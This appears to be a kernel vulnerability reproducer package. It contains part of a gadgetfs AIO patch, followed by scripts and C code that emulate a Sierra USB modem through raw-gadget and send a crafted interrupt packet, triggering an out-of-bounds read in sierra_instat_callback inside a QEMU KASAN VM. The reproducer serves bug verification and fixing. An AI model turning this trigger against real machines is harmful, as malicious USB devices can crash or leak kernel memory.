- 	} else {
-+		spin_unlock(&aio_lock);
- 		/* ep_copy_to_user() won't report both; we hide some faults */
- 		if (unlikely(0 != req->status))
- 			DBG(epdata->dev, "%s fault %d len %d\n",
-@@ -519,7 +569,8 @@ static void ep_aio_complete(struct usb_e
- 		schedule_work(&priv->work);
- 	}
- 
--	usb_ep_free_request(ep, req);
-+	if (!cancelling)	/* Not cancelled or cancellation is finished */
-+		usb_ep_free_request(ep, req);
- 	spin_unlock(&epdata->dev->lock);
- 	put_ep(epdata);
- }
-@@ -536,11 +587,11 @@ static ssize_t ep_aio(struct kiocb *iocb
- 	iocb->private = priv;
- 	priv->iocb = iocb;
- 
--	kiocb_set_cancel_fn(iocb, ep_aio_cancel);
- 	get_ep(epdata);
- 	priv->epdata = epdata;
- 	priv->actual = 0;
- 	priv->mm = current->mm; /* mm teardown waits for iocbs in exit_aio() */
-+	priv->aio_state = AIO_REQ_RUNNING;
- 
- 	/* each kiocb is coupled to one usb_request, but we can't
- 	 * allocate or submit those if the host disconnected.
-@@ -566,6 +617,7 @@ static ssize_t ep_aio(struct kiocb *iocb
- 		goto fail;
- 	}
- 	spin_unlock_irq(&epdata->dev->lock);
-+	kiocb_set_cancel_fn(iocb, ep_aio_cancel);
- 	return -EIOCBQUEUED;
- 
- fail:
+--- build_initramfs.sh ---
+#!/usr/bin/env bash
+# build_initramfs.sh - Minimal initramfs for the sierra_instat_callback
+# reproducer: BusyBox static + /init + PoC binary. No SSH, no user
+# accounts, no networking - the PoC runs at boot as root and powers off.
+#
+# Usage: ./build_initramfs.sh [-o <output_path>]
+
+set -euo pipefail
+
+SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
+OUTPUT="$SCRIPT_DIR/initramfs/initramfs.cpio.gz"
+
+# --- argument parsing ---
+while [[ $# -gt 0 ]]; do
+    case "$1" in
+        -o|--output) OUTPUT="$2"; shift 2 ;;
+        -h|--help)   sed -n '2,6p' "$0" | sed 's/^# \{0,1\}//'; exit 0 ;;
+        *)           echo "Unknown option: $1" >&2; exit 1 ;;
+    esac
+done
+OUTPUT="$(realpath -m "$OUTPUT")"
+
+command -v busybox >/dev/null 2>&1 \
+    || { echo "busybox not found (install: sudo apt install busybox-static)" >&2; exit 1; }
+BUSYBOX_BIN="$(command -v busybox)"
+
+WORKDIR="$(mktemp -d /tmp/initramfs_build.XXXXXX)"
+trap 'rm -rf "$WORKDIR"' EXIT
+ROOT="$WORKDIR/rootfs"
+
+mkdir -p "$ROOT"/{bin,sbin,dev,proc,sys,tmp,run,etc}
+
+# --- BusyBox + applets ---
+cp "$BUSYBOX_BIN" "$ROOT/bin/busybox"
+chmod +x "$ROOT/bin/busybox"
+for applet in $("$BUSYBOX_BIN" --list); do
+    ln -s /bin/busybox "$ROOT/bin/$applet" 2>/dev/null || true
+done
+
+# --- /init ---
+cat > "$ROOT/init" <<'INIT'
+#!/bin/sh
+export PATH=/bin:/sbin:/usr/bin:/usr/sbin
+
+mount -t proc     proc  /proc
+mount -t sysfs    sysfs /sys
+mount -t devtmpfs dev   /dev
+mount -t tmpfs    tmpfs /tmp
+mount -t tmpfs    tmpfs /run
+
+exec > /dev/console 2>&1
+exec < /dev/console
+
+# Let KASAN reports through
+echo 7 > /proc/sys/kernel/printk 2>/dev/null || true
+
+if [ -x /poc ]; then
+    /poc 2>&1
+    echo "[init] /poc exited with status $?"
+    poweroff -f
+fi
+exec /bin/sh
+INIT
+chmod +x "$ROOT/init"
+
+# --- PoC binary ---
+if [[ -f "$SCRIPT_DIR/poc.bin" ]]; then
+    cp "$SCRIPT_DIR/poc.bin" "$ROOT/poc"
+    chmod +x "$ROOT/poc"
+else
+    echo "warning: $SCRIPT_DIR/poc.bin not found; run build.sh first" >&2
+fi
+
+# --- Minimum /dev nodes (devtmpfs at runtime supplants these) ---
+(
+    cd "$ROOT/dev"
+    _SUDO="$(command -v fakeroot 2>/dev/null || echo sudo)"
+    $_SUDO mknod -m 622 console c 5 1 2>/dev/null || true
+    $_SUDO mknod -m 666 null    c 1 3 2>/dev/null || true
+)
+
+# --- Pack ---
+mkdir -p "$(dirname "$OUTPUT")"
+( cd "$ROOT"; find . | cpio -o -H newc 2>/dev/null ) | gzip -9 > "$OUTPUT"
+
+echo "initramfs: $OUTPUT ($(du -k "$OUTPUT" | cut -f1) KiB)"
+
+
+--- end build_initramfs.sh ---
+
+--- poc.sh ---
+
+#!/bin/bash
+set -euo pipefail
+
+SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
+LOGS_DIR="$SCRIPT_DIR/logs"
+rm -rf "$LOGS_DIR"
+mkdir -p "$LOGS_DIR/asan"
+
+BZIMAGE="$SCRIPT_DIR/builds/asan/bzImage"
+INITRAMFS="$SCRIPT_DIR/initramfs/initramfs.cpio.gz"
+
+if [[ ! -f "$BZIMAGE" ]]; then
+    echo "[poc.sh] ERROR: $BZIMAGE not found. Run build.sh first."
+    exit 1
+fi
+if [[ ! -f "$INITRAMFS" ]]; then
+    echo "[poc.sh] ERROR: $INITRAMFS not found. Run build.sh first."
+    exit 1
+fi
+
+# Determine QEMU acceleration
+ACCEL="-accel tcg"
+if [[ -e /dev/kvm ]] && [[ -w /dev/kvm ]]; then
+    ACCEL="-accel kvm"
+    echo "[poc.sh] Using KVM acceleration"
+else
+    echo "[poc.sh] Using TCG (no KVM)"
+fi
+
+SERIAL_LOG="$LOGS_DIR/asan/serial.log"
+TIMEOUT=180
+
+echo "[poc.sh] Booting ASAN kernel variant..."
+echo "[poc.sh] Serial log -> $SERIAL_LOG"
+
+# Boot QEMU with KASAN kernel
+# Use loglevel=3 (KERN_ERR) to capture KASAN reports while being quiet
+# kasan_multi_shot: allow multiple KASAN reports without halting
+timeout "$TIMEOUT" qemu-system-x86_64 \
+    $ACCEL \
+    -m 2048 \
+    -smp 2 \
+    -kernel "$BZIMAGE" \
+    -initrd "$INITRAMFS" \
+    -append "console=ttyS0 root=/dev/ram rdinit=/init quiet loglevel=3 printk.devkmsg=off kasan_multi_shot=1" \
+    -serial file:"$SERIAL_LOG" \
+    -display none \
+    -monitor none \
+    -no-reboot \
+    -net none \
+    2>/dev/null || true
+
+sleep 1
+
+echo "[poc.sh] QEMU exited. Checking logs..."
+
+# Also collect dmesg-like output from serial log
+cp "$SERIAL_LOG" "$LOGS_DIR/asan/dmesg.log" 2>/dev/null || true
+
+# Check for the target crash signature
+echo ""
+echo "===== Checking for KASAN slab-out-of-bounds in sierra_instat_callback ====="
+if grep -q "BUG: KASAN: slab-out-of-bounds in sierra_instat_callback" "$SERIAL_LOG" 2>/dev/null; then
+    echo "[poc.sh] SUCCESS: Found target crash signature!"
+    echo ""
+    echo "--- KASAN Report ---"
+    grep -A 50 "BUG: KASAN: slab-out-of-bounds in sierra_instat_callback" "$SERIAL_LOG" | strings | head -60
+    echo ""
+    echo "--- Allocation trace ---"
+    grep -A 20 "Allocated by task" "$SERIAL_LOG" | strings | head -25
+    echo "---"
+else
+    echo "[poc.sh] Crash signature NOT found. Checking for any KASAN report..."
+    if grep -q "BUG: KASAN" "$SERIAL_LOG" 2>/dev/null; then
+        echo "[poc.sh] Found KASAN report (may not match target):"
+        grep -B2 -A 30 "BUG: KASAN" "$SERIAL_LOG" | strings | head -40
+    else
+        echo "[poc.sh] No KASAN report found."
+        echo "[poc.sh] Last 50 lines of serial log:"
+        tail -50 "$SERIAL_LOG" 2>/dev/null | strings || echo "(empty)"
+    fi
+fi
+
+echo ""
+echo "===== Full serial log available at: $SERIAL_LOG ====="
+
+
+--- end poc.sh ---
+
+--- poc.c ---
+
+// SPDX-License-Identifier: 0BSD
+// PoC for sierra_instat_callback OOB read via raw-gadget + dummy_hcd
+//
+// Build: gcc -O2 -static -pthread -o poc poc.c
+
+#define _GNU_SOURCE
+#include <errno.h>
+#include <fcntl.h>
+#include <pthread.h>
+#include <signal.h>
+#include <stdint.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <dirent.h>
+#include <sys/ioctl.h>
+#include <sys/stat.h>
+#include <sys/types.h>
+
+#include <endian.h>
+#ifndef cpu_to_le16
+#define cpu_to_le16(x) htole16(x)
+#endif
+#ifndef le16_to_cpu
+#define le16_to_cpu(x) le16toh(x)
+#endif
+
+#include <linux/usb/ch9.h>
+#include <linux/usb/raw_gadget.h>
+
+static void die(const char *msg) {
+    perror(msg);
+    exit(1);
+}
+
+static int fd_raw = -1;
+static uint16_t ep_bulk_in_handle;
+static uint16_t ep_bulk_out_handle;
+static uint16_t ep_int_in_handle;
+
+static int ep0_write(const void *buf, size_t len) {
+    struct {
+        struct usb_raw_ep_io io;
+        uint8_t data[1024];
+    } __attribute__((packed)) req;
+    memset(&req, 0, sizeof(req));
+    req.io.ep = 0;
+    req.io.flags = 0;
+    req.io.length = (uint32_t)len;
+    if (len) memcpy(req.data, buf, len);
+    return ioctl(fd_raw, USB_RAW_IOCTL_EP0_WRITE, &req);
+}
+
+static int ep0_read(void *buf, size_t bufsz) {
+    struct {
+        struct usb_raw_ep_io io;
+        uint8_t data[1024];
+    } __attribute__((packed)) req;
+    memset(&req, 0, sizeof(req));
+    req.io.ep = 0;
+    req.io.flags = 0;
+    req.io.length = (uint32_t)bufsz;
+    int ret = ioctl(fd_raw, USB_RAW_IOCTL_EP0_READ, &req);
+    if (ret < 0) return -1;
+    if (buf && ret > 0) memcpy(buf, req.data, ret > (int)bufsz ? (int)bufsz : ret);
+    return ret;
+}
+
+static int ep0_stall(void) {
+    return ioctl(fd_raw, USB_RAW_IOCTL_EP0_STALL, 0);
+}
+
+static int ep_write(uint16_t eph, const void *buf, size_t len) {
+    struct {
+        struct usb_raw_ep_io io;
+        uint8_t data[4096];
+    } __attribute__((packed)) req;
+    memset(&req, 0, sizeof(req));
+    req.io.ep = eph;
+    req.io.flags = 0;
+    req.io.length = (uint32_t)len;
+    if (len) memcpy(req.data, buf, len);
+    return ioctl(fd_raw, USB_RAW_IOCTL_EP_WRITE, &req);
+}
+
+/* Packed 7-byte endpoint descriptor for config blob */
+struct ep7 {
+    uint8_t bLength;
+    uint8_t bDescriptorType;
+    uint8_t bEndpointAddress;
+    uint8_t bmAttributes;
+    uint16_t wMaxPacketSize;
+    uint8_t bInterval;
+} __attribute__((packed));
+
+/* Descriptors */
+static struct usb_device_descriptor dev_desc;
+static struct usb_qualifier_descriptor qual_desc;
+
+/* Config blob: 9 (config) + 9 (interface) + 7*3 (endpoints) = 39 bytes */
+static uint8_t cfg_buf[256];
+static size_t cfg_len;
+
+static struct usb_endpoint_descriptor ep_bulk_out_desc;
+static struct usb_endpoint_descriptor ep_bulk_in_desc;
+static struct usb_endpoint_descriptor ep_int_in_desc;
+
+static uint8_t addr_bulk_out;
+static uint8_t addr_bulk_in;
+static uint8_t addr_int_in;
+
+static void pick_eps(void) {
+    struct usb_raw_eps_info eps;
+    memset(&eps, 0, sizeof(eps));
+    int n = ioctl(fd_raw, USB_RAW_IOCTL_EPS_INFO, &eps);
+    if (n < 0) die("EPS_INFO");
+    addr_bulk_out = 0;
+    addr_bulk_in = 0;
+    addr_int_in = 0;
+    for (int i = 0; i < n; i++) {
+        struct usb_raw_ep_info *e = &eps.eps[i];
+        if (!e->name[0]) continue;
+        if (!addr_bulk_in && e->caps.type_bulk && e->caps.dir_in)
+            addr_bulk_in = (uint8_t)(e->addr | USB_DIR_IN);
+        if (!addr_bulk_out && e->caps.type_bulk && e->caps.dir_out)
+            addr_bulk_out = (uint8_t)(e->addr & 0x7f);
+        if (!addr_int_in && e->caps.type_int && e->caps.dir_in)
+            addr_int_in = (uint8_t)(e->addr | USB_DIR_IN);
+    }
+    if (!addr_bulk_out || addr_bulk_out == USB_RAW_EP_ADDR_ANY) addr_bulk_out = 1;
+    if (!addr_bulk_in || addr_bulk_in == USB_RAW_EP_ADDR_ANY) addr_bulk_in = USB_DIR_IN | 1;
+    if (!addr_int_in || addr_int_in == USB_RAW_EP_ADDR_ANY) addr_int_in = USB_DIR_IN | 2;
+    fprintf(stderr, "[poc] EPs: bout=0x%02x bin=0x%02x iin=0x%02x\n",
+            addr_bulk_out, addr_bulk_in, addr_int_in);
+}
+
+static void build_descriptors(void) {
+    memset(&dev_desc, 0, sizeof(dev_desc));
+    dev_desc.bLength = USB_DT_DEVICE_SIZE;
+    dev_desc.bDescriptorType = USB_DT_DEVICE;
+    dev_desc.bcdUSB = cpu_to_le16(0x0200);
+    dev_desc.bMaxPacketSize0 = 64;
+    dev_desc.idVendor = cpu_to_le16(0x1199);
+    dev_desc.idProduct = cpu_to_le16(0x0019);
+    dev_desc.bcdDevice = cpu_to_le16(0x0100);
+    dev_desc.iManufacturer = 1;
+    dev_desc.iProduct = 2;
+    dev_desc.iSerialNumber = 3;
+    dev_desc.bNumConfigurations = 1;
+
+    memset(&qual_desc, 0, sizeof(qual_desc));
+    qual_desc.bLength = sizeof(qual_desc);
+    qual_desc.bDescriptorType = USB_DT_DEVICE_QUALIFIER;
+    qual_desc.bcdUSB = cpu_to_le16(0x0200);
+    qual_desc.bMaxPacketSize0 = 64;
+    qual_desc.bNumConfigurations = 1;
+
+    /* Full 9-byte endpoint descriptors for EP_ENABLE */
+    memset(&ep_bulk_out_desc, 0, sizeof(ep_bulk_out_desc));
+    ep_bulk_out_desc.bLength = USB_DT_ENDPOINT_SIZE;
+    ep_bulk_out_desc.bDescriptorType = USB_DT_ENDPOINT;
+    ep_bulk_out_desc.bEndpointAddress = addr_bulk_out;
+    ep_bulk_out_desc.bmAttributes = USB_ENDPOINT_XFER_BULK;
+    ep_bulk_out_desc.wMaxPacketSize = cpu_to_le16(512);
+
+    memset(&ep_bulk_in_desc, 0, sizeof(ep_bulk_in_desc));
+    ep_bulk_in_desc.bLength = USB_DT_ENDPOINT_SIZE;
+    ep_bulk_in_desc.bDescriptorType = USB_DT_ENDPOINT;
+    ep_bulk_in_desc.bEndpointAddress = addr_bulk_in;
+    ep_bulk_in_desc.bmAttributes = USB_ENDPOINT_XFER_BULK;
+    ep_bulk_in_desc.wMaxPacketSize = cpu_to_le16(512);
+
+    memset(&ep_int_in_desc, 0, sizeof(ep_int_in_desc));
+    ep_int_in_desc.bLength = USB_DT_ENDPOINT_SIZE;
+    ep_int_in_desc.bDescriptorType = USB_DT_ENDPOINT;
+    ep_int_in_desc.bEndpointAddress = addr_int_in;
+    ep_int_in_desc.bmAttributes = USB_ENDPOINT_XFER_INT;
+    ep_int_in_desc.wMaxPacketSize = cpu_to_le16(8);
+    ep_int_in_desc.bInterval = 1;
+
+    /* Build the config descriptor blob manually to avoid alignment issues */
+    uint8_t *p = cfg_buf;
+
+    /* Config descriptor (9 bytes) */
+    struct usb_config_descriptor cfg;
+    memset(&cfg, 0, sizeof(cfg));
+    cfg.bLength = USB_DT_CONFIG_SIZE;
+    cfg.bDescriptorType = USB_DT_CONFIG;
+    /* wTotalLength filled below */
+    cfg.bNumInterfaces = 1;
+    cfg.bConfigurationValue = 1;
+    cfg.bmAttributes = 0x80;
+    cfg.bMaxPower = 50;
+    memcpy(p, &cfg, 9); p += 9;
+
+    /* Interface descriptor (9 bytes) */
+    struct usb_interface_descriptor intf;
+    memset(&intf, 0, sizeof(intf));
+    intf.bLength = USB_DT_INTERFACE_SIZE;
+    intf.bDescriptorType = USB_DT_INTERFACE;
+    intf.bInterfaceNumber = 0;
+    intf.bNumEndpoints = 3;
+    intf.bInterfaceClass = USB_CLASS_VENDOR_SPEC;
+    intf.bInterfaceSubClass = 0xff;
+    intf.bInterfaceProtocol = 0xff;
+    memcpy(p, &intf, 9); p += 9;
+
+    /* Endpoint descriptors (7 bytes each, packed manually) */
+    struct ep7 ep;
+
+    /* Bulk OUT */
+    memset(&ep, 0, 7);
+    ep.bLength = 7;
+    ep.bDescriptorType = USB_DT_ENDPOINT;
+    ep.bEndpointAddress = addr_bulk_out;
+    ep.bmAttributes = USB_ENDPOINT_XFER_BULK;
+    ep.wMaxPacketSize = cpu_to_le16(512);
+    ep.bInterval = 0;
+    memcpy(p, &ep, 7); p += 7;
+
+    /* Bulk IN */
+    memset(&ep, 0, 7);
+    ep.bLength = 7;
+    ep.bDescriptorType = USB_DT_ENDPOINT;
+    ep.bEndpointAddress = addr_bulk_in;
+    ep.bmAttributes = USB_ENDPOINT_XFER_BULK;
+    ep.wMaxPacketSize = cpu_to_le16(512);
+    ep.bInterval = 0;
+    memcpy(p, &ep, 7); p += 7;
+
+    /* Interrupt IN (wMaxPacketSize = 8: CRITICAL for OOB) */
+    memset(&ep, 0, 7);
+    ep.bLength = 7;
+    ep.bDescriptorType = USB_DT_ENDPOINT;
+    ep.bEndpointAddress = addr_int_in;
+    ep.bmAttributes = USB_ENDPOINT_XFER_INT;
+    ep.wMaxPacketSize = cpu_to_le16(8);
+    ep.bInterval = 1;
+    memcpy(p, &ep, 7); p += 7;
+
+    cfg_len = (size_t)(p - cfg_buf);
+    /* Patch wTotalLength */
+    cfg_buf[2] = (uint8_t)(cfg_len & 0xff);
+    cfg_buf[3] = (uint8_t)((cfg_len >> 8) & 0xff);
+
+    fprintf(stderr, "[poc] Config blob: %zu bytes total\n", cfg_len);
+}
+
+static void build_string_desc(uint8_t idx, uint8_t *out, size_t *out_len) {
+    if (idx == 0) {
+        out[0] = 4; out[1] = USB_DT_STRING;
+        out[2] = 0x09; out[3] = 0x04;
+        *out_len = 4;
+        return;
+    }
+    const char *s = (idx == 1) ? "Sierra" : (idx == 2) ? "AirCard" : "poc0";
+    size_t sl = strlen(s);
+    size_t total = 2 + sl * 2;
+    out[0] = (uint8_t)total;
+    out[1] = USB_DT_STRING;
+    for (size_t i = 0; i < sl; i++) {
+        out[2 + 2*i] = (uint8_t)s[i];
+        out[2 + 2*i + 1] = 0;
+    }
+    *out_len = total;
+}
+
+static volatile int threads_run = 1;
+
+static void *bulk_in_thread(void *arg) {
+    (void)arg;
+    uint8_t buf[512];
+    memset(buf, 0, sizeof(buf));
+    while (threads_run) {
+        int r = ep_write(ep_bulk_in_handle, buf, sizeof(buf));
+        if (r < 0) {
+            if (errno == ESHUTDOWN || errno == ENODEV)
+                break;
+            usleep(10000);
+        }
+    }
+    return NULL;
+}
+
+int main(int argc, char **argv) {
+    (void)argc; (void)argv;
+
+    fprintf(stderr, "[poc] Sierra OOB read PoC starting\n");
+
+    fd_raw = open("/dev/raw-gadget", O_RDWR | O_CLOEXEC);
+    if (fd_raw < 0) die("open /dev/raw-gadget");
+
+    /* Discover UDC */
+    char udc_name[128] = {0};
+    char driver_name[128] = {0};
+    DIR *d = opendir("/sys/class/udc");
+    if (!d) die("opendir /sys/class/udc");
+    struct dirent *de;
+    while ((de = readdir(d)) != NULL) {
+        if (de->d_name[0] == '.') continue;
+        snprintf(udc_name, sizeof(udc_name), "%s", de->d_name);
+        break;
+    }
+    closedir(d);
+    if (!udc_name[0]) { fprintf(stderr, "[poc] No UDC\n"); return 1; }
+
+    if (!strncmp(udc_name, "dummy_udc", 9))
+        snprintf(driver_name, sizeof(driver_name), "dummy_udc");
+    else
+        snprintf(driver_name, sizeof(driver_name), "%s", udc_name);
+
+    fprintf(stderr, "[poc] UDC: device=%s driver=%s\n", udc_name, driver_name);
+
+    struct usb_raw_init init;
+    memset(&init, 0, sizeof(init));
+    snprintf((char *)init.driver_name, sizeof(init.driver_name), "%s", driver_name);
+    snprintf((char *)init.device_name, sizeof(init.device_name), "%s", udc_name);
+    init.speed = USB_SPEED_HIGH;
+
+    if (ioctl(fd_raw, USB_RAW_IOCTL_INIT, &init) < 0) die("INIT");
+    if (ioctl(fd_raw, USB_RAW_IOCTL_RUN, 0) < 0) die("RUN");
+
+    fprintf(stderr, "[poc] Raw gadget running\n");
+
+    int configured = 0;
+
+    while (!configured) {
+        uint8_t evbuf[512];
+        memset(evbuf, 0, sizeof(evbuf));
+        struct usb_raw_event *ev = (struct usb_raw_event *)evbuf;
+        ev->length = sizeof(evbuf) - sizeof(*ev);
+
+        if (ioctl(fd_raw, USB_RAW_IOCTL_EVENT_FETCH, ev) < 0) {
+            if (errno == EINTR) continue;
+            die("EVENT_FETCH");
+        }
+
+        if (ev->type == USB_RAW_EVENT_CONNECT) {
+            fprintf(stderr, "[poc] CONNECT\n");
+            pick_eps();
+            build_descriptors();
+            continue;
+        }
+        if (ev->type == USB_RAW_EVENT_RESET) {
+            fprintf(stderr, "[poc] RESET\n");
+            continue;
+        }
+        if (ev->type != USB_RAW_EVENT_CONTROL) {
+            fprintf(stderr, "[poc] event type=%u\n", ev->type);
+            continue;
+        }
+        if (ev->length < sizeof(struct usb_ctrlrequest)) continue;
+
+        struct usb_ctrlrequest *setup = (struct usb_ctrlrequest *)ev->data;
+        uint8_t bmReqType = setup->bRequestType;
+        uint8_t bReq = setup->bRequest;
+        uint16_t wValue = le16_to_cpu(setup->wValue);
+        uint16_t wIndex = le16_to_cpu(setup->wIndex);
+        uint16_t wLength = le16_to_cpu(setup->wLength);
+
+        fprintf(stderr, "[poc] CTRL: rt=0x%02x rq=0x%02x val=0x%04x idx=0x%04x len=%u\n",
+                bmReqType, bReq, wValue, wIndex, wLength);
+
+        if ((bmReqType & USB_TYPE_MASK) == USB_TYPE_STANDARD) {
+            if (bReq == USB_REQ_GET_DESCRIPTOR) {
+                uint8_t dtype = (wValue >> 8) & 0xff;
+                uint8_t dindex = wValue & 0xff;
+                if (dtype == USB_DT_DEVICE) {
+                    size_t n = sizeof(dev_desc);
+                    if (n > wLength) n = wLength;
+                    ep0_write(&dev_desc, n);
+                } else if (dtype == USB_DT_CONFIG) {
+                    size_t n = cfg_len;
+                    if (n > wLength) n = wLength;
+                    ep0_write(cfg_buf, n);
+                } else if (dtype == USB_DT_STRING) {
+                    uint8_t sbuf[128];
+                    size_t slen = 0;
+                    build_string_desc(dindex, sbuf, &slen);
+                    if (slen > wLength) slen = wLength;
+                    ep0_write(sbuf, slen);
+                } else if (dtype == USB_DT_DEVICE_QUALIFIER) {
+                    size_t n = sizeof(qual_desc);
+                    if (n > wLength) n = wLength;
+                    ep0_write(&qual_desc, n);
+                } else {
+                    ep0_stall();
+                }
+                continue;
+            }
+            if (bReq == USB_REQ_SET_CONFIGURATION) {
+                fprintf(stderr, "[poc] SET_CONFIGURATION %u\n", wValue);
+                ep0_read(NULL, 0);
+                if (ioctl(fd_raw, USB_RAW_IOCTL_CONFIGURE, 0) < 0) die("CONFIGURE");
+                int h;
+                h = ioctl(fd_raw, USB_RAW_IOCTL_EP_ENABLE, &ep_bulk_out_desc);
+                if (h < 0) die("EP_ENABLE bulk_out");
+                ep_bulk_out_handle = (uint16_t)h;
+                h = ioctl(fd_raw, USB_RAW_IOCTL_EP_ENABLE, &ep_bulk_in_desc);
+                if (h < 0) die("EP_ENABLE bulk_in");
+                ep_bulk_in_handle = (uint16_t)h;
+                h = ioctl(fd_raw, USB_RAW_IOCTL_EP_ENABLE, &ep_int_in_desc);
+                if (h < 0) die("EP_ENABLE int_in");
+                ep_int_in_handle = (uint16_t)h;
+                fprintf(stderr, "[poc] EPs enabled: bout=%u bin=%u iin=%u\n",
+                        ep_bulk_out_handle, ep_bulk_in_handle, ep_int_in_handle);
+                configured = 1;
+                continue;
+            }
+            if (bReq == USB_REQ_SET_INTERFACE) {
+                ep0_read(NULL, 0);
+                continue;
+            }
+            if (bReq == USB_REQ_GET_STATUS) {
+                uint16_t status = 0;
+                size_t n = 2;
+                if (n > wLength) n = wLength;
+                ep0_write(&status, n);
+                continue;
+            }
+            if (!(bmReqType & USB_DIR_IN) && wLength == 0) {
+                ep0_read(NULL, 0);
+                continue;
+            }
+        }
+        /* Vendor/class requests */
+        if (!(bmReqType & USB_DIR_IN) && wLength == 0) {
+            ep0_read(NULL, 0);
+        } else if (!(bmReqType & USB_DIR_IN)) {
+            uint8_t tmpbuf[1024];
+            ep0_read(tmpbuf, wLength);
+        } else {
+            ep0_stall();
+        }
+    }
+
+    fprintf(stderr, "[poc] Configured. Starting bulk-in feeder.\n");
+
+    pthread_t bulkin_tid;
+    pthread_create(&bulkin_tid, NULL, bulk_in_thread, NULL);
+
+    fprintf(stderr, "[poc] Waiting for /dev/ttyUSB0...\n");
+    for (int i = 0; i < 200; i++) {
+        if (access("/dev/ttyUSB0", F_OK) == 0) break;
+        usleep(50000);
+    }
+
+    fprintf(stderr, "[poc] Opening /dev/ttyUSB0 (with retries)...\n");
+    int ttyfd = -1;
+    for (int attempt = 0; attempt < 50 && ttyfd < 0; attempt++) {
+        ttyfd = open("/dev/ttyUSB0", O_RDWR | O_NOCTTY | O_CLOEXEC);
+        if (ttyfd >= 0) break;
+        if (errno == EACCES) {
+            /* Permission not yet set by init helper */
+            usleep(100000);
+            continue;
+        }
+        /* Try other ttyUSB devices */
+        for (int n = 1; n < 5 && ttyfd < 0; n++) {
+            char path[32];
+            snprintf(path, sizeof(path), "/dev/ttyUSB%d", n);
+            ttyfd = open(path, O_RDWR | O_NOCTTY | O_CLOEXEC);
+            if (ttyfd >= 0) {
+                fprintf(stderr, "[poc] Opened %s\n", path);
+            }
+        }
+        if (ttyfd < 0) usleep(100000);
+    }
+    if (ttyfd < 0) {
+        fprintf(stderr, "[poc] No ttyUSB opened\n");
+        threads_run = 0;
+        close(fd_raw);
+        return 1;
+    }
+
+    fprintf(stderr, "[poc] ttyUSB opened. Waiting for URB submission...\n");
+    usleep(500000);
+
+    /* OOB-triggering interrupt packet: 8 bytes, starts with 0xA1 0x20 */
+    uint8_t int_pkt[8] = { 0xA1, 0x20, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
+
+    fprintf(stderr, "[poc] Sending OOB trigger interrupt-IN packet\n");
+    for (int i = 0; i < 10; i++) {
+        int ret = ep_write(ep_int_in_handle, int_pkt, sizeof(int_pkt));
+        if (ret < 0) {
+            fprintf(stderr, "[poc] ep_write(int) #%d: %s\n", i, strerror(errno));
+            break;
+        }
+        fprintf(stderr, "[poc] Interrupt pkt #%d delivered (%d bytes)\n", i, ret);
+        usleep(200000);
+    }
+
+    fprintf(stderr, "[poc] Done. KASAN should have reported slab-out-of-bounds.\n");
+    sleep(2);
+    threads_run = 0;
+    close(ttyfd);
+    close(fd_raw);
+    return 0;
+}
+
+--- end poc.c ---
+
